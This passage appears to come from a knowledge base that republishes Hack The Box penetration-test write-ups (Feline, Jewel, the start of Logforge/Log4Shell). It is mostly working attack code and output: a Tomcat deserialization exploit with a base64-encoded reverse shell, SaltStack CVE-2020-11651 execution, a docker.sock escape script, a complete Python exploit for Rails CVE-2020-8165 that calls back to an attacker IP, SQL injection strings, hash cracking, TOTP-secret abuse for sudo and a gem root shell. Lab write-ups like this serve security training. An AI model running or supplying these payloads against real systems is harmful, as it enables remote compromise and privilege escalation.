	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1579)
	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49)
	at java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1128)
	at java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:628)
	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
	at java.base/java.lang.Thread.run(Thread.java:834)
</div>
```

and we got the upload file location

``` bash
/opt/samples/uploads
```

we can see that there is something related to Java deserialization running behind the scene.

#### Tomcat JsessionID Insecure Deserialization CVE - User Shell

use a simple google search, we find an article to understand the public exploit CVE-2020-9484.

#### reference 1:
 - [Apache Tomcat RCE by deserialization CVE-2020-9484 writeup and exploit](https://www.redtimmy.com/java-hacking/apache-tomcat-rce-by-deserialization-cve-2020-9484-write-up-and-exploit/)

Requirements to exploit:

 - There is no authentication needed to upload a file to the server.  PersistentManager might be enabled, that’s why we got our file uploaded.
 - We have control over the location of the file and the name of the file.
 - Java Run time exec() function is the one which deserializes the JsessionID information in it.

Exploitation steps:

 - We need to create a Java Runtime Environment serialized Object and also save it in filename.session
 - Then it is needed to upload it to the server.
 - The final step is to modify the JSESSIONID to value like “../../../../malicious.session”.

Since the JSESSIONID is parsed by function java.lang.Runtime.exec(), we need to set bash or shell payload. Because NC, Socat command will get break inside the Runtime Environment.

#### reference 2:

 - [java.lang.Runtime.exec Payload Workarounds](http://jackson-t.ca/runtime-exec-payloads.html)

``` bash
bash -i >& /dev/tcp/10.10.14.4/4444 0>&1
```

can be changed to the following

``` bash
bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzQ0NDQgMD4mMQ==}|{base64,-d}|{bash,-i}
```

then make a bash script

exp.sh

``` bash
#!/bin/bash
payload="bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzQ0NDQgMD4mMQ==}|{base64,-d}|{bash,-i}"
java -jar ysoserial-master.jar CommonsCollections2 "${payload}" > gun1X.session
curl -F 'image=@gun1X.session' http://10.10.10.205:8080/upload.jsp?email=gunroot
curl --cookie "JSESSIONID=../../../../../opt/samples/uploads/gun1X" -L http://10.10.10.205:8080/upload.jsp?email=gunroot
```

before run this script we have to download ysoserial-master.jar

 - [download ysoserial-master.jar](https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar)

rename the file to ysoserial-master.jar

run exp.sh and we got a shell back, and owned the user flag

``` bash
root@kali:~# nc -lvp 4444
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.10.205.
Ncat: Connection from 10.10.10.205:39862.
bash: cannot set terminal process group (948): Inappropriate ioctl for device
bash: no job control in this shell
tomcat@VirusBucket:/opt/tomcat$ id
id
uid=1000(tomcat) gid=1000(tomcat) groups=1000(tomcat)
tomcat@VirusBucket:/opt/tomcat$ whoami
whoami
tomcat
tomcat@VirusBucket:/opt/tomcat$ cd ~
cd ~
tomcat@VirusBucket:~$ ls
ls
user.txt
tomcat@VirusBucket:~$ cat user.txt
cat user.txt
a485c52b48abe0381d0e8ad66342b159
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb85.jpg)

#### SaltStack Abusing ClearFuncs Class in Salt Master CVE Docker

There are a number of ports running in the localhost. Out of these, port number 4505 and 4506 returns a non-readable output.

``` bash
tomcat@VirusBucket:~$ netstat -lnpt
netstat -lnpt                                                                                                       
Active Internet connections (only servers)                                                                          
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name                    
tcp        0      0 127.0.0.1:4505          0.0.0.0:*               LISTEN      -                                   
tcp        0      0 127.0.0.1:4506          0.0.0.0:*               LISTEN      -                                   
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                                   
tcp        0      0 127.0.0.1:35345         0.0.0.0:*               LISTEN      -                                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                                   
tcp6       0      0 127.0.0.1:8005          :::*                    LISTEN      979/java                            
tcp6       0      0 :::8080                 :::*                    LISTEN      979/java                            
tcp6       0      0 :::22                   :::*                    LISTEN      -
tomcat@VirusBucket:~$ nc 127.0.0.1 4506
nc 127.0.0.1 4506
```

google it search "port 4505 and 4506"

While reading the documentation, found that this software has a critical vulnerability registered as CVE-2020-11651 and CVE-2020-11652.

Reference 3:

 - [CVE-2020-11651](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11651)

Reference 4:

 - [Public Exploit for CVE-2020-11651](https://raw.githubusercontent.com/jasperla/CVE-2020-11651-poc/master/exploit.py)

The above exploit needs the salt module. But our target machine doesn’t have the salt module in its python3 library.

``` bash
tomcat@VirusBucket:/opt/tomcat$ python3 -c "import salt"
python3 -c "import salt"
Traceback (most recent call last):
  File "<string>", line 1, in <module>
ModuleNotFoundError: No module named 'salt'
```

forwarded the port 4506 to my machine using Chisel.

 - [download chisel](https://github.com/jpillora/chisel/releases)

kali:

``` bash
root@kali:~/hackthebox/machine/feline# python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
10.10.10.205 - - [03/Sep/2020 13:42:51] "GET /chisel HTTP/1.1" 200 -
```

victim:

``` bash
tomcat@VirusBucket:/tmp$ wget http://10.10.14.4/chisel
tomcat@VirusBucket:/tmp$ ./chisel client 10.10.14.4:10000 R:4506:127.0.0.1:4506
<hisel client 10.10.14.4:10000 R:4506:127.0.0.1:4506
2020/09/03 17:47:51 client: Connecting to ws://10.10.14.4:10000
```

then kail Successfully port forwarded.

``` bash
root@kali:~/hackthebox/machine/feline# ./chisel server -p 10000 --reverse
2020/09/03 13:46:04 server: Reverse tunnelling enabled
2020/09/03 13:46:04 server: Fingerprint f3:d3:a8:bd:bf:15:5e:d1:18:db:db:c5:70:b4:28:d3
2020/09/03 13:46:04 server: Listening on http://0.0.0.0:10000
2020/09/03 13:46:55 server: session#1: tun: proxy#R:4506=>4506: Listening
```

then run the python3 exploit script:

``` bash
root@kali:~/hackthebox/machine/feline# python3 11.py --master 127.0.0.1 --exec 'bash -c "bash -i >& /dev/tcp/10.10.14.4/5555 0>&1"'
[!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.
[+] Checking salt-master (127.0.0.1:4506) status... ONLINE
[+] Checking if vulnerable to CVE-2020-11651... YES
[*] root key obtained: 8MeKojWxGMucT5TnNiiu1H4+rTdH9ZuGB3w2V+2Ef0sbHhmBjJU8Gil8bQuDbmJVHiSFo4rPlV0=
[+] Attemping to execute bash -c "bash -i >& /dev/tcp/10.10.14.4/5555 0>&1" on 127.0.0.1
[+] Successfully scheduled job: 20200903175545578002
```

then we got a root reverse shell in docker:

``` bash
root@kali:~# nc -lvp 5555
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::5555
Ncat: Listening on 0.0.0.0:5555
Ncat: Connection from 10.10.10.205.
Ncat: Connection from 10.10.10.205:39364.
bash: cannot set terminal process group (3706): Inappropriate ioctl for device
bash: no job control in this shell
root@2d24bf61767c:~# id
id
uid=0(root) gid=0(root) groups=0(root)
root@2d24bf61767c:~# whoami
whoami
root
```

#### Exposed Docker Socket Root

start some basic enumeration:

``` bash
root@2d24bf61767c:~# cat .bash_history
cat .bash_history
paswd
passwd
passwd
passswd
passwd
passwd
cd /root
ls
ls -la
rm .wget-hsts 
cd .ssh/
ls
cd ..
printf '- Add saltstack support to auto-spawn sandbox dockers.\n- Integrate changes to tomcat and make the service open to public.' > todo.txt
cat todo.txt 
printf -- '- Add saltstack support to auto-spawn sandbox dockers.\n- Integrate changes to tomcat and make the service open to public.' > todo.txt
cat todo.txt 
printf -- '- Add saltstack support to auto-spawn sandbox dockers.\n- Integrate changes to tomcat and make the service open to public.\' > todo.txt
printf -- '- Add saltstack support to auto-spawn sandbox dockers.\n- Integrate changes to tomcat and make the service open to public.\n' > todo.txt
printf -- '- Add saltstack support to auto-spawn sandbox dockers.\n- Integrate changes to tomcat and make the service open to public.\' > todo.txt
printf -- '- Add saltstack support to auto-spawn sandbox dockers.\n- Integrate changes to tomcat and make the service open to public.\n' > todo.txt
cat todo.txt 
printf -- '- Add saltstack support to auto-spawn sandbox dockers through events.\n- Integrate changes to tomcat and make the service open to public.\n' > todo.txt
cd /home/tomcat
cat /etc/passwd
exit
cd /root/
ls
cat todo.txt 
ls -la /var/run/
curl -s --unix-socket /var/run/docker.sock http://localhost/images/json
exit
```

Since docker.sock is the API used by the host to communicate with Docker containers, we can conclude that this is the way to get the contents of the root of the host.

``` bash
root@2d24bf61767c:~# curl -s --unix-socket /var/run/docker.sock http://localhost/images/json
<t /var/run/docker.sock http://localhost/images/json
[{"Containers":-1,"Created":1590787186,"Id":"sha256:a24bb4013296f61e89ba57005a7b3e52274d8edd3ae2077d04395f806b63d83e","Labels":null,"ParentId":"","RepoDigests":null,"RepoTags":["sandbox:latest"],"SharedSize":-1,"Size":5574537,"VirtualSize":5574537},{"Containers":-1,"Created":1588544489,"Id":"sha256:188a2704d8b01d4591334d8b5ed86892f56bfe1c68bee828edc2998fb015b9e9","Labels":null,"ParentId":"","RepoDigests":["<none>@<none>"],"RepoTags":["<none>:<none>"],"SharedSize":-1,"Size":1056679100,"VirtualSize":1056679100}]
```

We can access the docker.sock file. Let’s go and pwn this

Reference 5:

 - [Docker.sock Abusing](https://dejandayoff.com/the-danger-of-exposing-docker.sock/)

Based on the above reference, wrote a bash script to make this case easy.

``` bash
#!/bin/bash
pay="bash -c 'bash -i >& /dev/tcp/10.10.14.4/7777 0>&1'"
payload="[\"/bin/sh\",\"-c\",\"chroot /mnt sh -c \\\"$pay\\\"\"]"
response=$(curl -s -XPOST --unix-socket /var/run/docker.sock -d "{\"Image\":\"sandbox\",\"cmd\":$payload, \"Binds\": [\"/:/mnt:rw\"]}" -H 'Content-Type: application/json' http://localhost/containers/create)
revShellContainerID=$(echo "$response" | cut -d'"' -f4)
curl -s -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/$revShellContainerID/start
sleep 1
curl --output - -s --unix-socket /var/run/docker.sock "http://localhost/containers/$revShellContainerID/logs?stderr=1&stdout=1"
```

run the script on the target docker container

``` bash
root@2d24bf61767c:~# ./exp2.sh
./exp2.sh
```

and we got a reverse shell

``` bash
root@kali:~# nc -lvp 7777
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::7777
Ncat: Listening on 0.0.0.0:7777
Ncat: Connection from 10.10.10.205.
Ncat: Connection from 10.10.10.205:54680.
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
groups: cannot find name for group ID 11
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

root@959d801ec08f:/# id
id
uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
root@959d801ec08f:/# whoami
whoami
root
root@959d801ec08f:/# cat ~/root.txt
cat ~/root.txt
7817c299e73caba76e2f5dfa9f72291d
```

and owned the root.txt

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb86.jpg)

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb87.jpg)


#### Summary of knowledge

 - Tomcat JsessionID Insecure Deserialization CVE
 - use java.lang.Runtime.exec Payload Workarounds to generate payload
 - ysoserial-master.jar usage
 - SaltStack Abusing ClearFuncs Class in Salt Master CVE Docker
 - CVE-2020-11651 exploit
 - Chisel port forwarding
 - EXPOSING DOCKER.SOCK to ececute commands

#### Contact me

 - QQ: 1185151867
 - twitter: https://twitter.com/fdlucifer11
 - github: https://github.com/FDlucifer

<font color="blue">I'm lUc1f3r11, a ctfer, reverse engineer, ioter, red teamer, coder, gopher, pythoner, AI lover, security reseacher, hacker, bug hunter and more...</font>
<!-- kb:end feline -->

</details>

<a id="case-jewel"></a>

## Ruby 对象状态与账户迁移

源码和 Ruby 反序列化连接应用用户，后续结合数据库、口令及双因素认证材料进入本地提权。原始对象与执行顺序完整留存。

<p class="kb-provenance">来源 jewel · 原记录 2020-10-14 · 16 个代码块 · 4 处图片引用</p>

<details class="kb-evidence" id="record-jewel">
<summary>查看分析过程、攻击步骤与完整代码</summary>

<!-- kb:start jewel -->

#### introduce

OS: Linux
Difficulty: Medium
Points:	30
Release:	10 Oct 2020
IP:	10.10.10.211

User Blood haqpl	00 days, 01 hours, 43 mins, 28 seconds.
Root Blood Ziemni	00 days, 02 hours, 59 mins, 53 seconds.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb110.jpg)

 - ![my htb rank](http://www.hackthebox.eu/badge/image/235857)



#### information gathering

first use nmap as usaul

``` bash
root@kali:~/hackthebox/machine# nmap -sV -p- -v --min-rate=10000 10.10.10.211
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
8000/tcp open  http    Apache httpd 2.4.38
8080/tcp open  http    nginx 1.14.2 (Phusion Passenger 6.0.6)
Service Info: Host: jewel.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

 - ngnix and phusion passanger exploit is not found, creating a account
 - Profile picture cannot be changed so no chance of file upload vuln
 - Cannot create a content so injections might not be possible
 - Enumerated Dirs:

``` bash
/login (Status: 200)
/users (Status: 500)
/404 (Status: 200)
/articles (Status: 200)
/signup (Status: 200)
/500 (Status: 200)
/422 (Status: 200)
```

 - Nothing intresting movin on to port 8000
 - obtained users jennifer and bill has the password, spongebob
 - sql testing in login, payload

``` bash
' 1 or 1 = 1 -- -
```
 - Username was not valild, the sql query in the password field got accepted
 - Logging in with the username, test_wr3nch and password [' or 1 = 1 -- -]

(username is changed, cause its not valid)

#### Port 8000

``` bash
root@kali:~/hackthebox/machine/jewel# curl --head http://jewel.htb:8000/ -L
HTTP/1.1 302 Found
Date: Wed, 14 Oct 2020 08:56:30 GMT
Server: Apache/2.4.38 (Debian)
Location: http://jewel.htb:8000/gitweb/
Content-Type: text/html; charset=iso-8859-1

HTTP/1.1 200 OK
Date: Wed, 14 Oct 2020 08:56:42 GMT
Server: Apache/2.4.38 (Debian)
Vary: Accept-Encoding
Content-Type: text/html; charset=utf-8
```

 - No apache exploits in searchsploit
 - Hosts gitweb. (gitweb, web frontend to git repostories)

``` bash
<!-- git web interface version 2.20.1, (C) 2005-2006, Kay Sievers <kay.sievers@vrfy.org>, Christian Gierke -->
<!-- git core binaries version 2.20.1 -->
```
 - A simple console.log() in app/assets/javascripts/application.js

``` bash
console.log("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");
```
 - Got a hint from za10bx#3725 as redis
 - Looking deeper in the gitweb
 - db has a schema and a file that says everything is default
 - lib has nothing
 - log has nothing
 - public directory has the things enumerated via dir enumeration
 - storage has nothing
 - test has nothing
 - tmp has nothing
 - vendor has nothing

bd.sql file, which is a postgresql database dump from debian 11 has

``` bash
1 bill bill@mail.htb

2020-08-25 08:13:58.662464 2020-08-25 08:13:58.662464 

$2a$12$uhUssB8.HFpT4XpbhclQU.Oizufehl9qqKtmdxTXetojn2FcNncJW
2 jennifer jennifer@mail.htb

2020-08-25 08:54:42.8483 2020-08-25 08:54:42.8483 

$2a$12$ik.0o.TGRwMgUmyOR.Djzuyb/hjisgk2vws1xYC/hxw8M1nFk0MQy
```

 - Config.ru has nothing
 - In the Gemfile, Redis is inolved as a gem

Got creds from port 8000, back to port 8080

``` bash
root@kali:~/hackthebox/machine/jewel# john -format=bcrypt hashes -w=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 4096 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Session completed
Password obtained: spongebob
```

#### get usershell

 - looking at the redis / ruby cve
 
 - the cve-2020-8165 https://github.com/masahiro331/CVE-2020-8165

 - Looking at the PoC

``` bash
curl 'localhost:3000/users?new=%04%08o%3A%40ActiveSupport%3A%3ADeprecation%3A%3ADeprecatedInstanceVariableProxy%09%3A%0E%40instanceo%3A%08ERB%08%3A%09%40srcI%22%15%60touch+%2Ftmp%2Frce%60%06%3A%06ET%3A%0E%40filenameI%22%061%06%3B%09T%3A%0C%40linenoi%06%3A%0C%40method%3A%0Bresult%3A%09%40varI%22%0C%40result%06%3B%09T%3A%10%40deprecatorIu%3A%1FActiveSupport%3A%3ADeprecation%00%06%3B%09T'
```

 - While decoding it, we get

``` bash
localhost:3000/users?new=o:@ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy	:@instanceo:ERB:	@srcI"`touch /tmp/rce`:ET:@filenameI"1;	T:@linenoi:@method:result:	@varI"@result;	T:@deprecatorIu:ActiveSupport::Deprecation
```

 - Ok we have our payload, where do we inject it.. ? the only available places are login, signup and edit profile, login and signup gives error so that leaves with the edit profile,
 - While editing the username, capture the request in the burp and send it to
repeater. in the username paramater inject the url encoded payload and forward the request twice
 - refresh the http://jewel.htb/8080/articles twice while listening on the specified port, to obtain a reverse shell

 - or easily using the following python3 script

getuser.py

``` bash
import requests
import re
import sys
 
URL='http://{}:8080'.format(sys.argv[1])
username='myuser4'
password='mypass4'
email='myuser4@mail.com'
 
if len(sys.argv) != 4:
    print("specify target IP, your IP and port: python3 rev.py 10.10.xx.xx 9001")
    exit(0)
 
s = requests.Session()
 
resp = s.get(URL + '/signup')
rx = r'token" content="(.*)"'
 
token = re.search(rx,resp.text).group(1)
 
# create user
data = {}
data['utf8'] = 'â'
data['authenticity_token'] = token
data['user[username]'] = username
data['user[email]'] = email
data['user[password]'] = password
data['commit'] = 'Create User'
resp = s.post(URL + '/users', data=data)
 
# login
data = {}
data['utf8'] = 'â'
data['authenticity_token'] = token
data['session[email]'] = email
data['session[password]'] = password
data['commit'] = 'Log in'
resp = s.post(URL + '/login', data=data)
 
rx = r'href="/users/(.*)"'
user_id = re.search(rx,resp.text).group(1)
 
# rev shell
rev = "bash -c 'bash -i >& /dev/tcp/{}/{} 0>&1'".format(sys.argv[2], sys.argv[3])
payload = '\x04\x08o\x3A\x40ActiveSupport\x3A\x3ADeprecation\x3A\x3ADeprecatedInstanceVariableProxy'
payload += '\x09\x3A\x0E\x40instanceo\x3A\x08ERB\x08\x3A\x09\x40srcI\x22'
payload += '{}\x60{}\x60'.format(chr(len(rev)+7), rev)
payload += '\x06\x3A\x06ET\x3A\x0E\x40filenameI\x22\x061\x06\x3B\x09T\x3A\x0C\x40linenoi\x06\x3A\x0C\x40method\x3A'
payload += '\x0Bresult\x3A\x09\x40varI\x22\x0C\x40result\x06\x3B\x09T\x3A\x10\x40deprecatorIu\x3A\x1F'
payload += 'ActiveSupport\x3A\x3ADeprecation\x00\x06\x3B\x09T'
 
data = {}
data['utf8'] = 'â'
data['authenticity_token'] = token
data['_method'] = 'patch'
data['user[username]'] = payload
data['commit'] = 'Update User'
s.post(URL + '/users/' + user_id, data=data)
s.post(URL + '/users/' + user_id, data=data)
 
s.get(URL + '/articles')
```

``` bash
root@kali:~/hackthebox/machine/jewel# python3 getuser.py 10.10.10.211 10.10.14.3 3344
```

get a shell

``` bash
root@kali:~# nc -lvp 3344
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::3344
Ncat: Listening on 0.0.0.0:3344
Ncat: Connection from 10.10.10.211.
Ncat: Connection from 10.10.10.211:47546.
bash: cannot set terminal process group (791): Inappropriate ioctl for device
bash: no job control in this shell
bill@jewel:~/blog$ id
id
uid=1000(bill) gid=1000(bill) groups=1000(bill)
bill@jewel:~/blog$ whoami
whoami
bill
bill@jewel:~/blog$ cd ~
cd ~
bill@jewel:~$ ls
ls
blog
user.txt
bill@jewel:~$ cat user.txt
cat user.txt
b7c9e7532dda57b2362495bd05367fb0
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb111.jpg)

#### get rootshell

 - After obtaining the shell, run enumeration scripts LinEnum.sh
 - After enumerating scripts, found nothing intresting. The sudo version enumerated is that version 1.8.27, checking for its exploits lead to sudo 1.8.27 - Security Bypass https://www.exploit-db.com/exploits/47502
 - After going through the report, since we have the passsword that is cracked "spongebob" lets `sudo -l` it
 - sudo -l asks for a password which is normal, and asks something verification code.
 - ls -la the bills home directory reveals a hidden file .google_authenticator
 - cat the google authentication file has a secret key/hash in it. We can find the verification code with the secret hash

``` bash
bill@jewel:~$ cat .google_authenticator
cat .google_authenticator
2UQI3R52WFCLE6JTLDCSJYMJH4
" WINDOW_SIZE 17
" TOTP_AUTH
```

 - We used the Google Chromimum with an addon, GAuth Authenticator https://chrome.google.com/webstore/detail/gauth-authenticator/ilgcnhelpchnceeipipijaljkblbcobl to do the
task
 - We pasted the secret hash to the addon and it provided the OTP, with that we can sudo -l, and the /usr/bin/gem is available to be run as sudo

``` bash
bill@jewel:~$ sudo -l 
sudo -l
[sudo] password for bill: spongebob

Verification code: 437542

Matching Defaults entries for bill on jewel:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    insults

User bill may run the following commands on jewel:
    (ALL : ALL) /usr/bin/gem
```

 - with the gem GTFOBins https://gtfobins.github.io/gtfobins/gem, we are able to obtain the reverse shell
 - sudo /usr/bin/gem open -e "/bin/sh -c /bin/sh" rdoc

``` bash
bill@jewel:~$ sudo gem open -e "/bin/sh -c /bin/sh" rdoc
sudo gem open -e "/bin/sh -c /bin/sh" rdoc
# id
id
uid=0(root) gid=0(root) groups=0(root)
# whoami
whoami
root
# cd ~
cd ~
# ls
ls
root.txt
# cat root.txt
cat root.txt
458f634ac19fdd93ba6027a8cbe34197
```

 - root.txt is obtained

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb112.jpg)

#### Summary of knowledge

 - gitweb .sql leak pass hash
 - john crack bcrypt hash
 - write cve-2020-8165 exploit python3 script
 - use google_authenticator hash of Google Chromimum addon GAuth Authenticator to get the verification code
 - gem GTFOBins privesclation

#### Contact me

 - QQ: 1185151867
 - twitter: https://twitter.com/fdlucifer11
 - github: https://github.com/FDlucifer

<font color="blue">I'm lUc1f3r11, a ctfer, reverse engineer, ioter, red teamer, coder, gopher, pythoner, AI lover, security reseacher, hacker, bug hunter and more...</font>
<!-- kb:end jewel -->

</details>

<a id="case-log4j"></a>

## Logforge 中的 JNDI 与 classpath

HTB Logforge 环境验证 Log4Shell，原记录涵盖修改版 ysoserial、JNDI 工具和不同 JDK 约束。各类原始载荷和类路径条件完整并入。

<p class="kb-provenance">来源 log4j · 原记录 2021-12-29 · 21 个代码块 · 6 处图片引用</p>

<details class="kb-evidence" id="record-log4j">
<summary>查看分析过程、攻击步骤与完整代码</summary>

<!-- kb:start log4j -->

#### 介绍

本次复现环境使用的为hack the box的logforge靶场

#### 修改版ysoserial介绍

 - [ysoserial-modified](https://github.com/pimps/ysoserial-modified)

修改版ysoserial主要参考了[$@|sh – Or: Getting a shell environment from Runtime.exec](https://codewhitesec.blogspot.com/2015/03/sh-or-getting-shell-environment-from.html)这篇英文文章，如下。

``` bash
$ java Exec 'sh -c $@|sh . echo ps ft'
  PID TTY      STAT   TIME COMMAND
27109 pts/25   Ss     0:03 /bin/bash
 6904 pts/25   Sl+    0:00  \_ java Exec sh -c $@|sh . echo ps ft
 6914 pts/25   S+     0:00      \_ sh -c $@|sh . echo ps ft
 6916 pts/25   S+     0:00          \_ sh
 6917 pts/25   R+     0:00              \_ ps ft
```



由于Runtime.getRuntime().exec(String.class)在java中, 要嵌套复杂的命令, 需要控制pipes或将输出结果发送到文件(例: cat /etc/passwd > /tmp/passwd_copy), 因为该命令执行exec()方法从运行时类并不在一个终端环境中执行。一种可能的攻击行为是执行"/bin/sh -c 'command'"，但需要使用${IFS}转义'command'上的空格字符，否则它将无法正常工作。

解决这个问题的一个好办法是将参数传递给需要字符串数组的方法Runtime.getRuntime().exec(String[].class)。最好的选项是执行以下命令:

``` bash
Runtime.getRuntime().exec(new String[] {"/bin/sh", "-c", "command"})
```

传递参数, java会理解执行的/bin/bash传递参数 -c 和 “command” 的正确方法, 将在一个终端环境执行命令, 将允许使用嵌套或复杂的命令(和|或;)以及控制输入和输出(<和>)。

修改版添加了一个功能：ysoserial给终端的类型想要用来执行的命令(如cmd / bash / powershell或none), 修改版本将执行的命令在终端上下文允许执行任何复杂的命令!

#### 使用(如下是各种利用链的payload, 一般使用CommonsCollections5这个payload反弹shell)

``` bash
┌──(root💀kali-linux-2021-1)-[~/ysoserial-modified/target]
└─# java -jar ysoserial-modified.jar 
Y SO SERIAL?
Usage: java -jar ysoserial-[version]-all.jar [payload type] [terminal type: cmd / bash / powershell / none] '[command to execute]'
   ex: java -jar ysoserial-[version]-all.jar CommonsCollections5 bash 'touch /tmp/ysoserial'
	Available payload types:
		BeanShell1 [org.beanshell:bsh:2.0b5]
		C3P0 [com.mchange:c3p0:0.9.5.2, com.mchange:mchange-commons-java:0.2.11]
		CommonsBeanutils1 [commons-beanutils:commons-beanutils:1.9.2, commons-collections:commons-collections:3.1, commons-logging:commons-logging:1.2]
		CommonsCollections1 [commons-collections:commons-collections:3.1]
		CommonsCollections2 [org.apache.commons:commons-collections4:4.0]
		CommonsCollections3 [commons-collections:commons-collections:3.1]
		CommonsCollections4 [org.apache.commons:commons-collections4:4.0]
		CommonsCollections5 [commons-collections:commons-collections:3.1]
		CommonsCollections6 [commons-collections:commons-collections:3.1]
		FileUpload1 [commons-fileupload:commons-fileupload:1.3.1, commons-io:commons-io:2.4]
		Groovy1 [org.codehaus.groovy:groovy:2.3.9]
		Hibernate1 []
		Hibernate2 []
		JBossInterceptors1 [javassist:javassist:3.12.1.GA, org.jboss.interceptor:jboss-interceptor-core:2.0.0.Final, javax.enterprise:cdi-api:1.0-SP1, javax.interceptor:javax.interceptor-api:3.1, org.jboss.interceptor:jboss-interceptor-spi:2.0.0.Final, org.slf4j:slf4j-api:1.7.21]
		JRMPClient []
		JRMPListener []
		JSON1 [net.sf.json-lib:json-lib:jar:jdk15:2.4, org.springframework:spring-aop:4.1.4.RELEASE, aopalliance:aopalliance:1.0, commons-logging:commons-logging:1.2, commons-lang:commons-lang:2.6, net.sf.ezmorph:ezmorph:1.0.6, commons-beanutils:commons-beanutils:1.9.2, org.springframework:spring-core:4.1.4.RELEASE, commons-collections:commons-collections:3.1]
		JavassistWeld1 [javassist:javassist:3.12.1.GA, org.jboss.weld:weld-core:1.1.33.Final, javax.enterprise:cdi-api:1.0-SP1, javax.interceptor:javax.interceptor-api:3.1, org.jboss.interceptor:jboss-interceptor-spi:2.0.0.Final, org.slf4j:slf4j-api:1.7.21]
		Jdk7u21 []
		Jython1 [org.python:jython-standalone:2.5.2]
		MozillaRhino1 [rhino:js:1.7R2]
		Myfaces1 []
		Myfaces2 []
		ROME [rome:rome:1.0]
		Spring1 [org.springframework:spring-core:4.1.4.RELEASE, org.springframework:spring-beans:4.1.4.RELEASE]
		Spring2 [org.springframework:spring-core:4.1.4.RELEASE, org.springframework:spring-aop:4.1.4.RELEASE, aopalliance:aopalliance:1.0, commons-logging:commons-logging:1.2]
		Wicket1 [wicket-util:wicket-util:6.23]
```

#### 下载编译好的版本或者自己本地编译

从下面的github仓库的/target目录下载编译好的jar文件

``` bash
https://github.com/pimps/ysoserial-modified/raw/master/target/ysoserial-modified.jar
```

自己编译: 需要Java 1.7+ 和 Maven 3.x+

``` bash
$ git clone https://github.com/pimps/ysoserial-modified.git
$ cd ysoserial-modified
$ mvn clean package -DskipTests
```

编译好的jar文件将位于/target目录中

#### JNDI-Exploit-Kit介绍

 - [JNDI-Exploit-Kit](https://github.com/pimps/JNDI-Exploit-Kit)

[JNDI-Injection-Exploit](https://github.com/welk1n/JNDI-Injection-Exploit)的修改版本，由@welk1n创建。这个工具可以用来启动HTTP服务端、RMI服务器和LDAP服务端，从而利用java web应用程序容易受到JNDI注入的攻击, 以下是该攻击套件的新特性：

 - 增加对序列化java payload到LDAP payload的支持。允许任何java版本的利用，只要class存在于应用程序的class路径中，可以完全忽略trustURLCodebase=false。
 - 添加了一个正确的菜单，有帮助显示和指导
 - 增加一些命令行参数，修改服务的“IP:PORT”。这在目标机只能访问特定端口(如25、53、80、443等)的情况下很有用。
 - 为所有服务添加独立模式，这样就只能启动JettyServer (HTTP)，RMIServer或LDAPServer。HTTP地址也可以在独立模式下更改，以将请求重定向到不同的服务器。当目标只能访问单个端口(如端口53)，需要在端口53中跳转多个服务器才能成功利用的情况下将会有用。
 - 修改ASMified Transformer payload (java字节码)，以检测攻击代码将被触发的操作系统(windows或类似unix的系统)，并使用Runtime.getRuntime().exec(String[] cmd)在适当的终端shell中自动运行该命令, 自动映射为“cmd.exe /c command”或“/bin/bash -c command”。通过这种方式，可以控制pipes并将输出写入文件，等等。
 - 使用@orangetw发布的groove添加JNDI绕过payload
 - 将 EL bypass中的表达式语言修改为更简洁的payload，该payload检测操作系统并在适当的终端中运行命令(类似于修改后的ASMified Transformer代码)。
 - 增加两个JDK模板，JDK 1.6和 JDK 1.5。对于古老Java版本来说非常重要。

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/log4j1.png)

#### 描述

